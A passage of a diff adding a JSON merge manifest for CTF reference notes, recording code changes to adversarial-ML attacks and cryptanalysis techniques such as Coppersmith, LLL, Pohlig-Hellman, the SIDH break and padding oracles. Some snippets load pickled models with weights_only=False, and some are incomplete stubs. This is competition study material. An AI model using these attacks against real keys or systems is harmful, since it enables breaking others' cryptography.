@@ -1,0 +1,1107 @@
+[
+  {
+    "source": "ctf-ai-ml/adversarial-ml.md",
+    "heading": "## Adversarial Example Generation (FGSM, PGD, C&W)",
+    "destination": "ctf-ai-ml/adversarial-ml.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -38,10 +38,10 @@\n\n # Generate adversarial example\n epsilon = 0.03  # perturbation budget (L-inf norm)\n-x_adv = x + epsilon * x.grad.sign()\n-x_adv = torch.clamp(x_adv, x.min(), x.max())\n+perturbed_image = x + epsilon * x.grad.sign()\n+perturbed_image = torch.clamp(perturbed_image, 0, 1)\n \n # Check adversarial prediction\n with torch.no_grad():\n-    adv_output = model(x_adv)\n+    adv_output = model(perturbed_image)\n     adv_class = adv_output.argmax(dim=1).item()\n     print(f\"Adversarial prediction: class {adv_class}\")"
+  },
+  {
+    "source": "ctf-ai-ml/model-attacks.md",
+    "heading": "## ML Model Inversion via Gradient Descent (BSidesSF 2025)",
+    "destination": "ctf-ai-ml/model-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -11,9 +11,12 @@\n\n \n # Load the challenge model\n-model = torch.load(\"challenge_model.pt\", map_location=\"cpu\")\n+# NOTE (PyTorch 2.6+): torch.load defaults to weights_only=True, which blocks\n+# full pickled models. CTF model files need weights_only=False (only load\n+# files you trust \u2014 untrusted pickles can execute arbitrary code).\n+model = torch.load(\"challenge_model.pt\", map_location=\"cpu\", weights_only=False)\n model.eval()\n \n # Target: the output we want to invert (e.g., a specific embedding or class)\n-target_output = torch.load(\"target_embedding.pt\")  # shape depends on model\n+target_output = torch.load(\"target_embedding.pt\", weights_only=False)  # shape depends on model\n \n # Initialize random input (e.g., 3x224x224 image)"
+  },
+  {
+    "source": "ctf-ai-ml/model-attacks.md",
+    "heading": "## Neural Network Encoder Collision (RootAccess2026)",
+    "destination": "ctf-ai-ml/model-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -8,6 +8,6 @@\n\n import torch.optim as optim\n \n-# Load the encoder model\n-encoder = torch.load(\"encoder.pt\", map_location=\"cpu\")\n+# Load the encoder model (weights_only=False required on PyTorch 2.6+ for pickled models)\n+encoder = torch.load(\"encoder.pt\", map_location=\"cpu\", weights_only=False)\n encoder.eval()\n "
+  },
+  {
+    "source": "ctf-ai-ml/model-attacks.md",
+    "heading": "## Membership Inference Attack",
+    "destination": "ctf-ai-ml/model-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -9,6 +9,6 @@\n\n from sklearn.metrics import roc_auc_score\n \n-# Load challenge model\n-model = torch.load(\"target_model.pt\", map_location=\"cpu\")\n+# Load challenge model (weights_only=False required on PyTorch 2.6+ for pickled models)\n+model = torch.load(\"target_model.pt\", map_location=\"cpu\", weights_only=False)\n model.eval()\n "
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Elliptic Curve Isogenies",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -34,4 +34,5 @@\n\n     # Find least common ancestor\n     # Concatenate: path_up(start) + reversed(path_up(end))\n+    pass\n ```\n \n@@ -41,2 +42,44 @@\n\n - Look for special discriminants: -163, -67, -43, etc. (class number 1)\n \n+> \u26a0\ufe0f **SIDH is broken -- do not use \u03a6\u2082 walk when p = 2^a\u00b73^b \u00b1 1 and auxiliary torsion images are revealed.**\n+>\n+> If challenge gives `p = 2^a\u00b73^b \u00b1 1` and public data includes `\u03c6_A(P3), \u03c6_A(Q3)` (or `\u03c6_B(P2), \u03c6_B(Q2)`), it is SIDH/SIKE, not a generic isogeny volcano. Use the **Castryck-Decru** attack: `(2,2)-isogenies` on `E \u00d7 E` via **glue-and-split** (Kani's theorem), not modular-polynomial graph search. Reference Sage implementation: `castryck_decru_shortcut.sage` (Castryck-Decru 2022, eprint 2022/975 & 2022/1283; SIKEp434 broken in ~1h on single core). Pattern: guess one `3`-isogeny step, build auxiliary isogeny `\u03b3: E0 \u2192 X0` from known endomorphism ring of `E0: y^2 = x^3 + 6x^2 + x` (`(2i)^2 = [-4]`), form `X0 \u00d7 E_B \u2192 Jac(H)` (genus-2), apply Richelot `(2,2)`-chain; **splits iff guess correct** -- oracle recovers ternary secret digits iteratively.\n+\n+```python\n+# Detection: SIDH vs generic isogeny\n+def is_sidh_params(p):\n+    # p = 2^a * 3^b * f \u00b1 1  (SIKEp434: 2^216*3^137-1)\n+    tmp = p + 1 if p % 2 == 1 else p - 1  # try \u00b11\n+    # strip powers of 2 and 3\n+    for pr in (2, 3):\n+        while tmp % pr == 0:\n+            tmp //= pr\n+    return tmp < 1000  # small cofactor f\n+# If is_sidh_params(p) and challenge publishes torsion images, STOP: run Castryck-Decru, not \u03a62 walk.\n+```\n+\n+<details><summary>Sage fallback (optional) -- Castryck-Decru glue-and-split sketch</summary>\n+\n+```python\n+# Sage reference: castryck_decru_shortcut.sage (Wouter Castryck & Thomas Decru)\n+# https://github.com/WouterCastryck/Castryck-Decru-SageMath\n+from sage.all import GF, EllipticCurve\n+\n+# E0: y^2 = x^3 + 6*x^2 + x  (j=287496), known endomorphism ring with 2i s.t. (2i)^2 = -4\n+# Auxiliary isogeny gamma = [u] + [v]*(2i)  of degree d = u^2 + 4*v^2\n+# Glue X0 x E_B -> Jac(H) via Kani's theorem, then Richelot (2,2)-isogeny chain\n+# Split test: Jac(H') splits as E x E' iff guess for next 3-isogeny step is correct\n+# Full attack loops over ternary digits of Bob's secret (x_i in {0,1,2})\n+print(\"Use castryck_decru_shortcut.sage: load('castryck_decru_shortcut.sage'); attack(E0, EB, P3_images)\")\n+```\n+\n+</details>\n+\n+**CSIDH vs SIDH -- class-group action, not SIDH torsion:**\n+\n+- **CSIDH:** Action of ideal-class group `cl(O)` on supersingular curves over `F_p` (`p = 4\u00b7l1\u00b7...\u00b7ln - 1`). Private key is exponent vector `(e_i)` for ideals `l_i`; public key is `E_A = [a]\u00b7E0`. No auxiliary torsion points -- security relies on class-group action, not SIDH torsion oracle. Hard problem: find `a` s.t. `E_A = [a]E0`.\n+- **Volcano / ordinary isogeny walk reversal (RITSEC):** Ordinary curves form volcanoes keyed by `j-invariant` and `\u03a6_l(j1,j2)=0` neighbors. If challenge gives an `l`-isogeny oracle or `j`-walk steps without SIDH torsion, it is a volcano walk: reverse by walking from `j` via `\u03a6_l` roots and height estimation (random walks to crater/floor), not Castryck-Decru.\n+- **How to distinguish:** `p = 4*prod(l_i)-1` + class-group / `l`-isogeny language \u2192 CSIDH; `p = 2^a3^b\u00b11` + `\u03c6(P),\u03c6(Q)` images \u2192 SIDH (broken); generic `\u03a6\u2082 walk` + `j-invariant` + crater/leaf language \u2192 ordinary volcano.\n+\n+**References:** Castryck-Decru eprint 2022/975 & 2022/1283; De Feo-Jao SIDH; Castryck et al. CSIDH (2018); RITSEC volcano `j`-invariant walk.\n+"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Pohlig-Hellman Attack (Weak ECC)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,50 @@\n\n \n For elliptic curves with smooth order (many small prime factors):\n+\n+```python\n+from sympy import factorint\n+from sympy.ntheory.modular import crt\n+\n+def bsgs(g, h, p, order=None):\n+    from math import isqrt\n+    if order is None:\n+        order = p - 1\n+    m = isqrt(order) + 1\n+    table = {}\n+    power = 1\n+    for j in range(m):\n+        table[power] = j\n+        power = (power * g) % p\n+    factor = pow(g, -m, p)\n+    gamma = h\n+    for i in range(m):\n+        if gamma in table:\n+            return i * m + table[gamma]\n+        gamma = (gamma * factor) % p\n+    return None\n+\n+def pohlig_hellman(g, h, p):\n+    order = p - 1\n+    factors = factorint(order)\n+    residues, moduli = [], []\n+    for prime, exp in factors.items():\n+        pe = prime ** exp\n+        cofactor = order // pe\n+        gi = pow(g, cofactor, p)\n+        hi = pow(h, cofactor, p)\n+        xi = bsgs(gi, hi, p, order=pe)\n+        residues.append(xi)\n+        moduli.append(pe)\n+    x, _ = crt(moduli, residues)\n+    return x\n+\n+# For ECC: use ecdsa/py_ecc point multiplication instead of pow;\n+# factor curve order with factorint, then Pohlig-Hellman via BSGS on points\n+# Example for multiplicative group DLP: pohlig_hellman(g, h, p)\n+from sympy import factorint as _factorint\n+# E order: factor with sympy, then BSGS per subgroup (see ecc-attacks.md Smart/Pohlig)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -30,2 +76,4 @@\n\n ```\n \n+</details>\n+"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Baby-Step Giant-Step for General DLP",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,5 +1,5 @@\n\n ## Baby-Step Giant-Step for General DLP\n \n-**Pattern:** Compute discrete logarithm `x` where `g^x = h (mod p)` in O(sqrt(n)) time and space, where n is the group order. Works for any cyclic group \u2014 multiplicative groups mod p, elliptic curves, or abstract groups. Combined with Pohlig-Hellman for smooth-order groups, solves DLP when `p-1` (or group order) has only small prime factors.\n+**Pattern:** Compute discrete logarithm `x` where `g^x = h (mod p)` in O(sqrt(n)) time and space, where n is the group order. Works for any cyclic group -- multiplicative groups mod p, elliptic curves, or abstract groups. Combined with Pohlig-Hellman for smooth-order groups, solves DLP when `p-1` (or group order) has only small prime factors.\n \n **Baby-step giant-step algorithm:**\n@@ -74,7 +74,7 @@\n\n \n **When to recognize:**\n-- ElGamal, DSA, or Diffie-Hellman with a randomly generated prime \u2014 check if `p-1` is smooth: `factor(p-1)` in Sage\n-- ECC with smooth curve order \u2014 same approach, replace modular exponentiation with point multiplication\n-- Challenge generates new parameters on each connection \u2014 retry until you get a smooth prime\n+- ElGamal, DSA, or Diffie-Hellman with a randomly generated prime -- check if `p-1` is smooth: `factor(p-1)` in Sage\n+- ECC with smooth curve order -- same approach, replace modular exponentiation with point multiplication\n+- Challenge generates new parameters on each connection -- retry until you get a smooth prime\n - Challenge description mentions \"weak parameters\" or uses suspiciously small primes\n "
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## LLL Algorithm for Approximate GCD",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,4 +4,24 @@\n\n \n **Lattice construction:**\n+```python\n+from fpylll import IntegerMatrix, LLL\n+\n+# Collect 3 hints from server\n+# h_i = f * p_i + n_i (noise is small)\n+# Construct lattice where short vector reveals primes\n+\n+M = IntegerMatrix.from_matrix([\n+    [1, 0, 0, h1],\n+    [0, 1, 0, h2],\n+    [0, 0, 1, h3],\n+    [0, 0, 0, -1]  # Scaling factor\n+])\n+LLL.reduction(M)\n+# Short vector contains p1, p2, p3\n+# Recover f = (h1 - n1) / p1\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n ```python\n from sage.all import *\n@@ -23,2 +43,4 @@\n\n ```\n \n+</details>\n+"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Merkle-Hellman Knapsack Cryptosystem via LLL (ASIS 2014)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,25 @@\n\n \n The Merkle-Hellman knapsack is a broken asymmetric scheme. Given public key P = [p0, ..., pn-1] and ciphertext C (sum of selected public key elements), recover the binary plaintext vector:\n+\n+```python\n+from fpylll import IntegerMatrix, LLL\n+\n+nbit = len(pubKey)\n+rows = [[0]*(nbit+1) for _ in range(nbit+1)]\n+for i in range(nbit):\n+    rows[i][i] = 1\n+    rows[i][nbit] = int(pubKey[i])\n+rows[nbit][nbit] = -int(encoded)\n+A = IntegerMatrix.from_matrix(rows)\n+LLL.reduction(A)\n+\n+# Find row with last element == 0 and all others in {0, 1}\n+for row in A:\n+    if row[-1] == 0 and all(b in (0, 1) for b in row[:-1]):\n+        plaintext_bits = list(row[:-1])\n+        break\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -26,4 +47,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** The knapsack problem becomes easy when reformulated as a shortest vector problem. The LLL-reduced basis contains a row representing the binary plaintext when the last column is zero.\n "
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Coppersmith via Howgrave-Graham Lattice (fpylll primary)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Coppersmith's Method (Close Private Keys)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,10 +1,37 @@\n\n ## Coppersmith's Method (Close Private Keys)\n \n-**Pattern (Duality of Key):** Two RSA key pairs with d1 \u2248 d2 (small difference).\n+**Pattern (Duality of Key):** Two RSA key pairs with d1 approx d2 (small difference).\n \n **Attack:**\n ```python\n-# From e1*d1 \u2261 1 mod \u03c6 and e2*d2 \u2261 1 mod \u03c6:\n-# d2 - d1 \u2261 (e1*e2)^(-1) * (e1 - e2) mod p\n+from fpylll import IntegerMatrix, LLL\n+from sympy import Poly, symbols\n+import math\n+x = symbols(\"x\")\n+# hg_matrix defined above -- reuse here\n+\n+# From e1*d1 == 1 mod phi and e2*d2 == 1 mod phi:\n+# d2 - d1 == (e1*e2)^(-1) * (e1 - e2) mod p\n+r = (pow(e1 * e2, -1, N) * (e1 - e2)) % N\n+# f(x) = x - r  (monic, lc==1) with root x0 = d2-d1\n+f_coeffs = [(-r) % N, 1]\n+X = 2**128\n+beta = 0.5\n+B = IntegerMatrix.from_matrix(hg_matrix(f_coeffs, N, X, beta, m=4, t=1))\n+LLL.reduction(B)\n+roots = hg_small_roots(f_coeffs, N, X, beta=0.5, m=4, t=1)\n+if roots:\n+    x_val = int(roots[0])\n+    p = math.gcd(int(r - x_val) % N, N)\n+    q = N // p\n+else:\n+    roots = []  # no root -- try larger m/t or adjust X/beta\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n+# From e1*d1 == 1 mod phi and e2*d2 == 1 mod phi:\n+# d2 - d1 == (e1*e2)^(-1) * (e1 - e2) mod p\n \n # Construct polynomial f(x) = (r - x) mod p where x = d2-d1\n@@ -18,2 +45,4 @@\n\n ```\n \n+</details>\n+"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Coppersmith's Method (Structured Primes, LACTF 2026)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,11 +1,36 @@\n\n ## Coppersmith's Method (Structured Primes, LACTF 2026)\n \n-**Pattern (six-seven-again):** p = base + 10^k \u00b7 x where base is fully known, x is small.\n+**Pattern (six-seven-again):** p = base + 10^k * x where base is fully known, x is small.\n \n-**Condition:** x < N^{1/e} for degree-e polynomial (\u2248 N^0.25 for linear).\n+**Condition:** x < N^{1/e} for degree-e polynomial (approx N^0.25 for linear).\n \n **Attack:**\n ```python\n-# p = base + 10^k * x, so x \u2261 -base * (10^k)^{-1} (mod p)\n+from fpylll import IntegerMatrix, LLL\n+import math\n+# hg_matrix / hg_small_roots defined above\n+\n+# p = base + 10^k * x, so x == -base * (10^k)^{-1} (mod p)\n+# Since p | N, construct polynomial with root x mod N\n+inv_10k = pow(10**k, -1, N)\n+f_const = (base * inv_10k) % N  # f(x)= x + const, monic lc==1\n+f_coeffs = [f_const, 1]\n+X = 2**70\n+beta = 0.5\n+B = IntegerMatrix.from_matrix(hg_matrix(f_coeffs, N, X, beta, m=4, t=1))\n+LLL.reduction(B)\n+roots = hg_small_roots(f_coeffs, N, X, beta=0.5, m=4, t=1)\n+if roots:\n+    x_val = int(roots[0])\n+    p = base + 10**k * x_val\n+    q = N // p\n+else:\n+    roots = []  # no root -- try larger m/t or adjust X/beta\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n+# p = base + 10^k * x, so x == -base * (10^k)^{-1} (mod p)\n # Since p | N, construct polynomial with root x mod N\n R.<x> = PolynomialRing(Zmod(N))\n@@ -19,8 +44,11 @@\n\n ```\n \n+</details>\n+\n **Key details:**\n-- Polynomial MUST be monic (leading coefficient 1)\n-- `beta=0.5` means we're looking for a factor \u2265 N^0.5\n-- `X` parameter is upper bound on root size\n+- Polynomial MUST be monic (leading coefficient 1) -- hg_matrix checks lc==1 else scales by inv_lc mod N\n+- `beta=0.5` means we're looking for a factor >= N^0.5\n+- `X` parameter is explicit upper bound on root size (e.g. `2**128`, `2**70`)\n+- `m, t` control lattice dim `d*m+t`; tune for bound vs dim>100 (flatter optional)\n - Works for any \"partially known prime\" pattern\n "
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Quaternion RSA",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -21,5 +21,5 @@\n\n ```\n \n-**Critical property:** For quaternion `q = s + v` (scalar + vector), `q^k = s_k + t_k*v` \u2014 the vector part stays **proportional** under exponentiation. This means the ratios of imaginary components are preserved:\n+**Critical property:** For quaternion `q = s + v` (scalar + vector), `q^k = s_k + t_k*v` -- the vector part stays **proportional** under exponentiation. This means the ratios of imaginary components are preserved:\n \n `c1 : c2 : c3 = a1 : a2 : a3 (mod n)`\n@@ -56,4 +56,7 @@\n\n \n ```python\n+from sympy.ntheory.modular import crt\n+from Crypto.Util.number import long_to_bytes\n+\n # Group order for quaternions over F_p divides p\u00b2-1\n d_p = pow(e, -1, p**2 - 1)\n@@ -66,6 +69,6 @@\n\n dec_q = matrix_pow(enc_mod_q, d_q, q)\n \n-# CRT combine: dec_matrix[0][0] = m (the flag)\n-m = CRT(dec_p[0][0], dec_q[0][0], p, q)\n+# CRT combine: dec_matrix[0][0] = m (the flag) via sympy.ntheory.modular.crt\n+m, _ = crt([p, q], [dec_p[0][0], dec_q[0][0]])\n flag = long_to_bytes(m)\n ```"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Manger's RSA Padding Oracle Attack (Nullcon 2026)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -14,9 +14,11 @@\n\n # f1/2 < threshold/k <= f1, so k is in [threshold/f1, threshold/(f1/2)]\n \n+from Crypto.Util.number import ceil_div\n+\n # Phase 2: Binary search for exact key\n lo, hi = 0, threshold\n while lo < hi:\n     mid = (lo + hi) // 2\n-    f_test = ceil(threshold, mid + 1)  # f such that k*f >= threshold iff k > mid\n+    f_test = ceil_div(threshold, mid + 1)  # f such that k*f >= threshold iff k > mid\n     if oracle(encrypt(f_test)) == \"above\":\n         hi = mid"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## LWE Lattice Attack via CVP (EHAX 2026)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -5,5 +5,5 @@\n\n **LWE solving with fpylll (CVP/Babai):**\n ```python\n-from fpylll import IntegerMatrix, LLL, CVP\n+from fpylll import IntegerMatrix, LLL, CVP, GSO\n import numpy as np\n \n@@ -38,6 +38,11 @@\n\n     target = [int(b[i]) for i in range(m)] + [0] * n\n \n-    # CVP via Babai's nearest plane\n-    closest = CVP.babai(B, target)\n+    # CVP via Babai's nearest plane (GSO.Mat.babai).\n+    # Exact alternative for small dims (<40): CVP.closest_vector(B, target).\n+    from fpylll import GSO\n+    M_gso = GSO.Mat(B)\n+    M_gso.update_gso()\n+    w = M_gso.babai(target)\n+    closest = B.multiply_left(w)\n \n     # Extract secret from last n components"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Affine Cipher over Non-Prime Modulus (Nullcon 2026)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -14,5 +14,5 @@\n\n def crt2(r1, m1, r2, m2):\n     \"\"\"CRT: x = r1 (mod m1) and x = r2 (mod m2)\"\"\"\n-    m1_inv = pow(m1, m2 - 2, m2)  # Fermat's little theorem\n+    m1_inv = pow(m1, -1, m2)\n     t = ((r2 - r1) * m1_inv) % m2\n     return (r1 + m1 * t) % (m1 * m2)"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Introspective CRC via GF(2) Linear Algebra (Google CTF 2017)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,34 @@\n\n \n **Pattern:** Find an ASCII string whose CRC-N value equals the string itself (self-referential CRC). Model CRC as a linear function over GF(2) and solve the resulting system.\n+\n+```python\n+# CRC is linear over GF(2): CRC(a XOR b) = CRC(a) XOR CRC(b)\n+# Goal: find x where CRC(x) = x (as ASCII hex)\n+# 1. Compute CRC of all-zeros baseline\n+# 2. For each bit position, compute the CRC difference (remainder)\n+# 3. Set up GF(2) linear system: CRC(x) XOR x = 0\n+# 4. Solve with Gaussian elimination over GF(2)\n+from sympy import Matrix\n+from sympy.polys.domains import GF as SymGF\n+\n+F = SymGF(2)\n+# Build matrix where each column represents flipping one bit\n+# Rows represent the CRC output bits XOR input bits\n+M = Matrix.zeros(n_bits, n_bits)\n+# ... fill with CRC remainders (0/1 entries) ...\n+# Solve: use sympy rref or gauss_jordan over GF(2)\n+# solution = M.gauss_jordan_solve(target_vector)  # or custom GF(2) elimination\n+# Example helper:\n+def solve_gf2(M, b):\n+    # M: sympy Matrix over GF(2), b: column vector\n+    aug = M.row_join(b)\n+    rref, pivots = aug.rref(iszerofunc=lambda x: x % 2 == 0, simplify=True)\n+    # Extract solution (assumes unique)\n+    sol = [int(rref[i, -1] % 2) for i in range(len(pivots))]\n+    return sol\n+solution = solve_gf2(M, target_vector)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -19,4 +49,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** CRC is a linear function over GF(2). The self-referential constraint CRC(x)=x becomes a system of linear equations over GF(2), solvable by Gaussian elimination. The ASCII constraint requires choosing free variables to keep all bytes in the printable range.\n "
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Baby-Step Giant-Step for Sparse/Low Hamming Weight Exponents (SEC-T CTF 2017)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,7 +1,7 @@\n\n ## Baby-Step Giant-Step for Sparse/Low Hamming Weight Exponents (SEC-T CTF 2017)\n \n-**Pattern:** DLP where the exponent is known to have low Hamming weight \u2014 e.g., at most k=11 bits set in a 128-bit exponent. Split the exponent into two halves `e = e1 * 2^64 + e2`. Precompute baby steps for all `e1` values with \u230ak/2\u230b = 5 bits set, then do giant steps for all `e2` values with \u2308k/2\u2309 = 6 bits set.\n+**Pattern:** DLP where the exponent is known to have low Hamming weight -- e.g., at most k=11 bits set in a 128-bit exponent. Split the exponent into two halves `e = e1 * 2^64 + e2`. Precompute baby steps for all `e1` values with \u230ak/2\u230b = 5 bits set, then do giant steps for all `e2` values with \u2308k/2\u2309 = 6 bits set.\n \n-**Complexity:** `C(128, 5) \u2248 10^8` baby steps + `C(128, 6) \u2248 10^9` giant steps \u2014 vastly less than `O(2^128)` brute force or `O(2^64)` standard BSGS.\n+**Complexity:** `C(128, 5) \u2248 10^8` baby steps + `C(128, 6) \u2248 10^9` giant steps -- vastly less than `O(2^128)` brute force or `O(2^64)` standard BSGS.\n \n ```python"
+  },
+  {
+    "source": "ctf-crypto/advanced-math.md",
+    "heading": "## Hensel's Lemma: Polynomial Root Lifting mod p^k (CONFidence CTF 2019 Teaser)",
+    "destination": "ctf-crypto/advanced-math.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,7 +4,7 @@\n\n \n ```python\n-# sage\n-R.<x> = PolynomialRing(ZZ)\n-pol   = ...           # polynomial with huge coefficients\n+from sympy import Poly, symbols\n+x = symbols('x')\n+pol = Poly(..., x, domain='ZZ')  # polynomial with huge coefficients\n p     = 35671\n k     = 100\n@@ -21,5 +21,5 @@\n\n         mod_next = mod * p\n         # r' = r - P(r) * inverse(P'(r), p) mod p^(i+1)\n-        inv = inverse_mod(int(dpol(r)) % p, p)\n+        inv = pow(int(dpol(r)) % p, -1, p)\n         r = (r - int(pol(r)) * inv) % mod_next\n         mod = mod_next\n@@ -29,3 +29,3 @@\n\n ```\n \n-**Key insight:** Any polynomial equation `P(x) \u2261 0 mod p^k` with `p` small and `p` not dividing `P'(root)` collapses to enumerating roots mod `p` (cheap) plus `k - 1` Newton-style lifts. Each lift requires *reducing intermediate values mod `p^(i+1)` at every step* \u2014 Sage's naive `solve_right` or unreduced iteration grinds to a halt because `P(r)` grows as large integers. Works for any `N = p^k` or more generally `N = prod(p_i^{k_i})` by lifting each prime-power factor independently and recombining via CRT.\n+**Key insight:** Any polynomial equation `P(x) \u2261 0 mod p^k` with `p` small and `p` not dividing `P'(root)` collapses to enumerating roots mod `p` (cheap) plus `k - 1` Newton-style lifts. Each lift requires *reducing intermediate values mod `p^(i+1)` at every step* -- Sage's naive `solve_right` or unreduced iteration grinds to a halt because `P(r)` grows as large integers. Works for any `N = p^k` or more generally `N = prod(p_i^{k_i})` by lifting each prime-power factor independently and recombining via CRT."
+  },
+  {
+    "source": "ctf-crypto/classic-ciphers.md",
+    "heading": "## 3D Vigenere Palindrome Symmetry Key Recovery (SECCON 2017)",
+    "destination": "ctf-crypto/classic-ciphers.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -12,4 +12,5 @@\n\n         if (c1 + c2) % len(s) == known_sum:\n             # test this key pair\n+            pass\n ```\n "
+  },
+  {
+    "source": "ctf-crypto/dh-attacks.md",
+    "destination": "ctf-crypto/dh-attacks.md",
+    "decision": "imported",
+    "reason": "New upstream reference; reviewed and boundary-gated"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,4 +4,8 @@\n\n - [Singular Curves](#singular-curves)\n - [Smart's Attack (Anomalous Curves)](#smarts-attack-anomalous-curves)\n+- [HNP Cross-Link: ECDSA Truncated Nonces \u2192 Lattice (8-sig example)](#hnp-cross-link-ecdsa-truncated-nonces--lattice-8-sig-example)\n+- [MOV Attack (Weil Pairing, embedding degree k\u22646)](#mov-attack-weil-pairing-embedding-degree-k6)\n+- [Twist Security & Twist Attacks](#twist-security--twist-attacks)\n+- [GLV / CM Endomorphism Leakage (d=-3/-4)](#glv--cm-endomorphism-leakage-d-3-4)\n - [ECC Fault Injection](#ecc-fault-injection)\n - [Clock Group DLP via Pohlig-Hellman (LACTF 2026)](#clock-group-dlp-via-pohlig-hellman-lactf-2026)"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Small Subgroup Attacks",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
